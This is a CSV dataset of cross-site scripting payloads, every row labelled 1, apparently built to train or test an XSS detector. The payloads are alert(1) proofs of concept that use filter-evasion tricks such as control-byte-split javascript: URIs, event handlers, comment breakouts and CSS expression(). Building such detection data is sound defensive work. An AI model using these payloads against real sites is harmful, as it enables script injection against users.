input,label
"<bgsound onPropertyChange bgsound onPropertyChange=""javascript:javascript:alert(1)""></bgsound onPropertyChange>",1
"<html onMouseLeave html onMouseLeave=""javascript:javascript:alert(1)""></html onMouseLeave>",1
"<html onMouseWheel html onMouseWheel=""javascript:javascript:alert(1)""></html onMouseWheel>",1
"<style onLoad style onLoad=""javascript:javascript:alert(1)""></style onLoad>",1
"<iframe onReadyStateChange iframe onReadyStateChange=""javascript:javascript:alert(1)""></iframe onReadyStateChange>",1
"<body onPageShow body onPageShow=""javascript:javascript:alert(1)""></body onPageShow>",1
"<style onReadyStateChange style onReadyStateChange=""javascript:javascript:alert(1)""></style onReadyStateChange>",1
"<frameset onFocus frameset onFocus=""javascript:javascript:alert(1)""></frameset onFocus>",1
"<applet onError applet onError=""javascript:javascript:alert(1)""></applet onError>",1
"<marquee onStart marquee onStart=""javascript:javascript:alert(1)""></marquee onStart>",1
"<script onLoad script onLoad=""javascript:javascript:alert(1)""></script onLoad>",1
"<html onMouseOver html onMouseOver=""javascript:javascript:alert(1)""></html onMouseOver>",1
"<html onMouseEnter html onMouseEnter=""javascript:parent.javascript:alert(1)""></html onMouseEnter>",1
"<body onBeforeUnload body onBeforeUnload=""javascript:javascript:alert(1)""></body onBeforeUnload>",1
"<html onMouseDown html onMouseDown=""javascript:javascript:alert(1)""></html onMouseDown>",1
"<marquee onScroll marquee onScroll=""javascript:javascript:alert(1)""></marquee onScroll>",1
"<xml onPropertyChange xml onPropertyChange=""javascript:javascript:alert(1)""></xml onPropertyChange>",1
"<frameset onBlur frameset onBlur=""javascript:javascript:alert(1)""></frameset onBlur>",1
"<applet onReadyStateChange applet onReadyStateChange=""javascript:javascript:alert(1)""></applet onReadyStateChange>",1
"<svg onUnload svg onUnload=""javascript:javascript:alert(1)""></svg onUnload>",1
"<html onMouseOut html onMouseOut=""javascript:javascript:alert(1)""></html onMouseOut>",1
"<body onMouseMove body onMouseMove=""javascript:javascript:alert(1)""></body onMouseMove>",1
"<body onResize body onResize=""javascript:javascript:alert(1)""></body onResize>",1
"<object onError object onError=""javascript:javascript:alert(1)""></object onError>",1
"<body onPopState body onPopState=""javascript:javascript:alert(1)""></body onPopState>",1
"<html onMouseMove html onMouseMove=""javascript:javascript:alert(1)""></html onMouseMove>",1
"<applet onreadystatechange applet onreadystatechange=""javascript:javascript:alert(1)""></applet onreadystatechange>",1
"<body onpagehide body onpagehide=""javascript:javascript:alert(1)""></body onpagehide>",1
"<svg onunload svg onunload=""javascript:javascript:alert(1)""></svg onunload>",1
"<applet onerror applet onerror=""javascript:javascript:alert(1)""></applet onerror>",1
"<body onkeyup body onkeyup=""javascript:javascript:alert(1)""></body onkeyup>",1
"<body onunload body onunload=""javascript:javascript:alert(1)""></body onunload>",1
"<iframe onload iframe onload=""javascript:javascript:alert(1)""></iframe onload>",1
"<body onload body onload=""javascript:javascript:alert(1)""></body onload>",1
"<html onmouseover html onmouseover=""javascript:javascript:alert(1)""></html onmouseover>",1
"<object onbeforeload object onbeforeload=""javascript:javascript:alert(1)""></object onbeforeload>",1
"<body onbeforeunload body onbeforeunload=""javascript:javascript:alert(1)""></body onbeforeunload>",1
"<body onfocus body onfocus=""javascript:javascript:alert(1)""></body onfocus>",1
"<body onkeydown body onkeydown=""javascript:javascript:alert(1)""></body onkeydown>",1
"<iframe onbeforeload iframe onbeforeload=""javascript:javascript:alert(1)""></iframe onbeforeload>",1
"<iframe src iframe src=""javascript:javascript:alert(1)""></iframe src>",1
"<svg onload svg onload=""javascript:javascript:alert(1)""></svg onload>",1
"<html onmousemove html onmousemove=""javascript:javascript:alert(1)""></html onmousemove>",1
"<body onblur body onblur=""javascript:javascript:alert(1)""></body onblur>",1
\x3Cscript>javascript:alert(1)</script>,1
"'""`><script>/* *\x2Fjavascript:alert(1)// */</script>",1
<script>javascript:alert(1)</script\x0D,1
<script>javascript:alert(1)</script\x0A,1
<script>javascript:alert(1)</script\x0B,1
"<script charset=""\x22>javascript:alert(1)</script>",1
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->,1
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->,1
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->,1
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->,1
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->,1
"`""'><img src='#\x27 onerror=javascript:alert(1)>",1
"<a href=""javascript\x3Ajavascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
<a href=javas\x00cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x07cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x0Dcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x0Acript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x08cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x02cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x03cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x04cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x01cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x05cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x0Bcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x09cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x06cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javas\x0Ccript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
<script>/* *\x2A/javascript:alert(1)// */</script>,1
<script>/* *\x00/javascript:alert(1)// */</script>,1
"<style></style\x3E<img src=""about:blank"" onerror=javascript:alert(1)//></style>",1
"<style></style\x0D<img src=""about:blank"" onerror=javascript:alert(1)//></style>",1
"<style></style\x09<img src=""about:blank"" onerror=javascript:alert(1)//></style>",1
"<style></style\x20<img src=""about:blank"" onerror=javascript:alert(1)//></style>",1
"<style></style\x0A<img src=""about:blank"" onerror=javascript:alert(1)//></style>",1
"'`>ABC<div style=font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF ",1
"'`>ABC<div style=font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF ",1
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E,1
"<script>if(""x\\xE1\x96\x89"".length==2) { javascript:alert(1);}</script>",1
"<script>if(""x\\xE0\xB9\x92"".length==2) { javascript:alert(1);}</script>",1
"<script>if(""x\\xEE\xA9\x93"".length==2) { javascript:alert(1);}</script>",1
"'`""><\x3Cscript>javascript:alert(1)</script>",1
"'`""><\x00script>javascript:alert(1)</script>",1
"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
'`><\x00img src=xxx:x onerror=javascript:alert(1)>",1
"<script src=""data:text/plain\x2Cjavascript:alert(1)""></script>",1
"<script src=""data:\xD4\x8F",1
"<script src=""data:\xE0\xA4\x98",1
"<script src=""data:\xCB\x8F",1
"<script\x20type=""text/javascript"">javascript:alert(1);</script>",1
"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",1
"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",1
"<script\x09type=""text/javascript"">javascript:alert(1);</script>",1
"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",1
"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",1
"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",1
"ABC<div style=""x\x3Aexpression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:expression\x5C(javascript:alert(1)"">DEF",1
"ABC<div style=""x:expression\x00(javascript:alert(1)"">DEF",1
"ABC<div style=""x:exp\x00ression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:exp\x5Cression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\x0Aexpression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\x09expression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\xE3\x80\x80expression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\xE2\x80\x84expression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\xC2\xA0expression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\xE2\x80\x80expression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\xE2\x80\x8Aexpression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\x0Dexpression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\x0Cexpression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\xE2\x80\x87expression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\xEF\xBB\xBFexpression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\x20expression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\xE2\x80\x88expression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\x00expression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\xE2\x80\x8Bexpression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\xE2\x80\x86expression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\xE2\x80\x85expression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\xE2\x80\x82expression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\x0Bexpression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\xE2\x80\x81expression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\xE2\x80\x83expression(javascript:alert(1)"">DEF",1
"ABC<div style=""x:\xE2\x80\x89expression(javascript:alert(1)"">DEF",1
"<a href=""\x0Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x0Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xC2\xA0javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x05javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xE1\xA0\x8Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x18javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x11javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xE2\x80\x88javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xE2\x80\x89javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xE2\x80\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x17javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x03javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x0Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x1Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x00javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x10javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xE2\x80\x82javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x20javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x13javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x09javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xE2\x80\x8Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x14javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x19javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xE2\x80\xAFjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x1Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xE2\x80\x81javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x1Djavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xE2\x80\x87javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x07javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xE1\x9A\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xE2\x80\x83javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x04javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x01javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x08javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xE2\x80\x84javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xE2\x80\x86javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xE3\x80\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x12javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x0Djavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x0Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x0Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x15javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xE2\x80\xA8javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x16javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x02javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x1Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x06javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xE2\x80\xA9javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xE2\x80\x85javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x1Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\xE2\x81\x9Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""\x1Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javascript\x00:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javascript\x3A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javascript\x09:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javascript\x0D:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<a href=""javascript\x0A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"`""'><img src=xxx:x \x0Aonerror=javascript:alert(1)>",1
"`""'><img src=xxx:x \x22onerror=javascript:alert(1)>",1
"`""'><img src=xxx:x \x0Bonerror=javascript:alert(1)>",1
"`""'><img src=xxx:x \x0Donerror=javascript:alert(1)>",1
"`""'><img src=xxx:x \x2Fonerror=javascript:alert(1)>",1
"`""'><img src=xxx:x \x09onerror=javascript:alert(1)>",1
"`""'><img src=xxx:x \x0Conerror=javascript:alert(1)>",1
"`""'><img src=xxx:x \x00onerror=javascript:alert(1)>",1
"`""'><img src=xxx:x \x27onerror=javascript:alert(1)>",1
"`""'><img src=xxx:x \x20onerror=javascript:alert(1)>",1
"`'><script>\x3Bjavascript:alert(1)</script>
`'><script>\x0Djavascript:alert(1)</script>",1
"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
`'><script>\xE2\x80\x81javascript:alert(1)</script>",1
"`'><script>\xE2\x80\x84javascript:alert(1)</script>
`'><script>\xE3\x80\x80javascript:alert(1)</script>",1
"`'><script>\x09javascript:alert(1)</script>
`'><script>\xE2\x80\x89javascript:alert(1)</script>",1
"`'><script>\xE2\x80\x85javascript:alert(1)</script>
`'><script>\xE2\x80\x88javascript:alert(1)</script>",1
"`'><script>\x00javascript:alert(1)</script>
`'><script>\xE2\x80\xA8javascript:alert(1)</script>",1
"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
`'><script>\xE1\x9A\x80javascript:alert(1)</script>",1
"`'><script>\x0Cjavascript:alert(1)</script>
`'><script>\x2Bjavascript:alert(1)</script>",1
"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
`'><script>-javascript:alert(1)</script>",1
"`'><script>\x0Ajavascript:alert(1)</script>
`'><script>\xE2\x80\xAFjavascript:alert(1)</script>",1
"`'><script>\x7Ejavascript:alert(1)</script>
`'><script>\xE2\x80\x87javascript:alert(1)</script>",1
"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
`'><script>\xE2\x80\xA9javascript:alert(1)</script>",1
"`'><script>\xC2\x85javascript:alert(1)</script>
`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>",1
"`'><script>\xE2\x80\x83javascript:alert(1)</script>
`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>",1
"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
`'><script>\xE2\x80\x80javascript:alert(1)</script>",1
"`'><script>\x21javascript:alert(1)</script>
`'><script>\xE2\x80\x82javascript:alert(1)</script>",1
"`'><script>\xE2\x80\x86javascript:alert(1)</script>
`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>",1
"`'><script>\x0Bjavascript:alert(1)</script>
`'><script>\x20javascript:alert(1)</script>",1
"`'><script>\xC2\xA0javascript:alert(1)</script>
/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />",1
"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />",1
"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />",1
"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />",1
"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />",1
<script\x2F>javascript:alert(1)</script>,1
<script\x20>javascript:alert(1)</script>,1
<script\x0D>javascript:alert(1)</script>,1
<script\x0A>javascript:alert(1)</script>,1
<script\x0C>javascript:alert(1)</script>,1
<script\x00>javascript:alert(1)</script>,1
<script\x09>javascript:alert(1)</script>,1
"`""'><img src=xxx:x onerror\x0B=javascript:alert(1)>",1
"`""'><img src=xxx:x onerror\x00=javascript:alert(1)>",1
"`""'><img src=xxx:x onerror\x0C=javascript:alert(1)>",1
"`""'><img src=xxx:x onerror\x0D=javascript:alert(1)>",1
"`""'><img src=xxx:x onerror\x20=javascript:alert(1)>",1
"`""'><img src=xxx:x onerror\x0A=javascript:alert(1)>",1
"`""'><img src=xxx:x onerror\x09=javascript:alert(1)>",1
<script>javascript:alert(1)<\x00/script>,1
"<img src=# onerror\x3D""javascript:alert(1)"" >",1
<input onfocus=javascript:alert(1) autofocus>,1
<input onblur=javascript:alert(1) autofocus><input autofocus>,1
<video poster=javascript:javascript:alert(1)//,1
<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,1
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X,1
"<video><source onerror=""javascript:javascript:alert(1)"">",1
"<video onerror=""javascript:javascript:alert(1)""><source>",1
"<form><button formaction=""javascript:javascript:alert(1)"">X",1
<body oninput=javascript:alert(1)><input autofocus>,1
"<math href=""javascript:javascript:alert(1)"">CLICKME</math>  <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>",1
<frameset onload=javascript:alert(1)>,1
"<table background=""javascript:javascript:alert(1)"">",1
"<!--<img src=""--><img src=x onerror=javascript:alert(1)//"">",1
"<comment><img src=""</comment><img src=x onerror=javascript:alert(1))//"">",1
"<![><img src=""]><img src=x onerror=javascript:alert(1)//"">",1
"<style><img src=""</style><img src=x onerror=javascript:alert(1)//"">",1
<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,1
"<head><base href=""javascript://""></head><body><a href=""/. /",1
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>,1
"<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>",1
"<object data=""data:text/html;base64",1
"<embed src=""data:text/html;base64",1
<b <script>alert(1)</script>0,1
"<div id=""div1""><input value=""``onmouseover=javascript:alert(1)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1"").innerHTML;</script>",1
"<x '=""foo""><x foo='><img src=x onerror=javascript:alert(1)//'>",1
"<embed src=""javascript:alert(1)"">",1
"<img src=""javascript:alert(1)"">",1
"<image src=""javascript:alert(1)"">",1
"<script src=""javascript:alert(1)"">",1
<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x,1
"<? foo=""><script>javascript:alert(1)</script>"">",1
"<! foo=""><script>javascript:alert(1)</script>"">",1
"</ foo=""><script>javascript:alert(1)</script>"">",1
"<? foo=""><x foo='?><script>javascript:alert(1)</script>'>"">",1
"<! foo=""[[[Inception]]""><x foo=""]foo><script>javascript:alert(1)</script>"">",1
"<% foo><x foo=""%><script>javascript:alert(1)</script>"">",1
"<div id=d><x xmlns=""><iframe onload=javascript:alert(1)""></div> <script>d.innerHTML=d.innerHTML</script>",1
"<img \x00src=x onerror=""alert(1)"">",1
"<img \x47src=x onerror=""javascript:alert(1)"">",1
"<img \x11src=x onerror=""javascript:alert(1)"">",1
"<img \x12src=x onerror=""javascript:alert(1)"">",1
"<img\x47src=x onerror=""javascript:alert(1)"">",1
"<img\x10src=x onerror=""javascript:alert(1)"">",1
"<img\x13src=x onerror=""javascript:alert(1)"">",1
"<img\x32src=x onerror=""javascript:alert(1)"">",1
"<img\x47src=x onerror=""javascript:alert(1)"">",1
"<img\x11src=x onerror=""javascript:alert(1)"">",1
"<img \x47src=x onerror=""javascript:alert(1)"">",1
"<img \x34src=x onerror=""javascript:alert(1)"">",1
"<img \x39src=x onerror=""javascript:alert(1)"">",1
"<img \x00src=x onerror=""javascript:alert(1)"">",1
"<img src\x09=x onerror=""javascript:alert(1)"">",1
"<img src\x10=x onerror=""javascript:alert(1)"">",1
"<img src\x13=x onerror=""javascript:alert(1)"">",1
"<img src\x32=x onerror=""javascript:alert(1)"">",1
"<img src\x12=x onerror=""javascript:alert(1)"">",1
"<img src\x11=x onerror=""javascript:alert(1)"">",1
"<img src\x00=x onerror=""javascript:alert(1)"">",1
"<img src\x47=x onerror=""javascript:alert(1)"">",1
"<img src=x\x09onerror=""javascript:alert(1)"">",1
"<img src=x\x10onerror=""javascript:alert(1)"">",1
"<img src=x\x11onerror=""javascript:alert(1)"">",1
"<img src=x\x12onerror=""javascript:alert(1)"">",1
"<img src=x\x13onerror=""javascript:alert(1)"">",1
"<img[a][b][c]src[d]=x[e]onerror=[f]""alert(1)"">",1
"<img src=x onerror=\x09""javascript:alert(1)"">",1
"<img src=x onerror=\x10""javascript:alert(1)"">",1
"<img src=x onerror=\x11""javascript:alert(1)"">",1
"<img src=x onerror=\x12""javascript:alert(1)"">",1
"<img src=x onerror=\x32""javascript:alert(1)"">",1
"<img src=x onerror=\x00""javascript:alert(1)"">",1
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>,1
"<img src=""x` `<script>javascript:alert(1)</script>""` `>",1
"<img src onerror /"" '""= alt=javascript:alert(1)//"">",1
<title onpropertychange=javascript:alert(1)></title><title title=>,1
"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=x:x onerror=javascript:alert(1)></a>"">",1
<!--[if]><script>javascript:alert(1)</script -->,1
<!--[if<img src=x onerror=javascript:alert(1)//]> -->,1
"<script src=""/\%(jscript)s""></script>",1
"<script src=""\\%(jscript)s""></script>",1
"<object id=""x"" classid=""clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598""></object> <object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""javascript:alert(1)"" style=""behavior:url(#x);""><param name=postdomevents /></object>",1
"<a style=""-o-link:'javascript:javascript:alert(1)';-o-link-source:current"">X",1
